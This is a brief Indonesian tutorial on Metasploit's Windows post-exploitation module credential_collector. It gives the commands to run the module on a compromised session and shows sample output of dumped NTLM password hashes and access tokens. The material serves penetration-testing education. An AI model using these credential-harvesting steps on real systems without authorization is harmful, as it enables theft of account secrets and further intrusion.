# credential_collector

Modul `credential_collector` di Metasploit adalah modul `post-exploitation` untuk sistem Windows yang digunakan untuk mengumpulkan berbagai jenis kredensial dari komputer target, termasuk `username`, `password`, `token`, dan `informasi login lainnya` yang tersimpan di sistem.

## Cara Penggunaan di Metasploit

```
use post/windows/gather/credentials/credential_collector
set SESSION <ID>
set VERBOSE true
run
```

Hasil output-nya seperti ini:

```
[*] Running module against ADMIN-PC
[+] Collecting hashes...
    Extracted: admin:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634
    Extracted: Administrator:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
    Extracted: Guest:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
    Extracted: HomeGroupUser$:aad3b435b51404eeaad3b435b51404ee:afd92ce617b3210a7243ac63c8b3cf98
    Extracted: loginbang:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
[+] Collecting tokens...
    admin-PC\admin
    NT AUTHORITY\LOCAL SERVICE
    NT AUTHORITY\NETWORK SERVICE
    NT AUTHORITY\SYSTEM
    No tokens available
[*] Post module execution completed
```
